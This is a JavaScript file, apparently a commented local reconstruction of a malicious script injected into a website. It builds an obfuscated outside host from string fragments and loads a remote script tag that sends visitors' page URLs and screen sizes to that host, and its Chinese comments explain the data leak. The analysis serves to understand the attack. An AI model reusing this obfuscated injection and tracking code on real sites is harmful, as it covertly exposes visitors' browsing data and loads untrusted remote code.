// http://s.voitsport.com/rb/c.js

(function(d) {
    function $a(p) {
        try {
            var x = d.getElementsByTagName("head")[0];
            x.appendChild($s(p))
        } catch (e) {}
    }
    function $c(n) {
        return d.createElement(n)
    }
    function $s(p) {
        var j = $c("script");
        j.src = p;
        j.async = true;
        j.type = "text/javascript";
        return j
    }
    var amt = 0;

    function $rn() {
        var ww = d.body.clientWidth;
        var hh = d.body.clientHeight;
        var u = {
            j: "ht",
            c: "com",
            q: "tp:",
            m: "orjx.",
            n: "vict",
            d: "img."
        }
        //为了本地演示,修改为本地地址
        //var be = u.j + u.q + "//" + u.d + u.n + u.m + u.c; // http://img.victorjx.com
        var be = "./2.js";
        var en = escape(window.location.href) + "&a=" + Math.random() + "&w=" + ww + "&h=" + hh;
        if (top == this) {
            if (ww < 400 || hh < 200) {
                amt += 1;
                if (amt < 6) {
                    setTimeout($rn, 1000)
                } else {
                    //为了本地演示,修改为
                    //$a(be + "/fmt/m.php?u=" + en)
                    $a(be + "?u=" + en)
                }
            } else {
                //为了本地演示,修改为
                //$a(be + "/fmt/?u=" + en)
                $a(be + "?u=" + en)
            }
        }
    }
    setTimeout($rn, 12)
})(document);

//  --->
// 如果屏幕比较宽,判断为手机 创建这个script标签, 值得注意的是设置了异步加载,防止阻塞页面
// <script src="http://img.victorjx.com/fmt/?u=......"> 通过get发送请求,将用户访问的网址加随机数加屏幕的宽高发给服务器
// 如果屏幕比较窄 < 400 判断为手机 创建针对手机的脚本标签
// <script src="http://img.victorjx.com/fmt/m.php?u=......"> 通过get发送请求,将用户访问的网址加随机数加屏幕的宽高发给服务器
// 隐私通过 window.location.href 泄露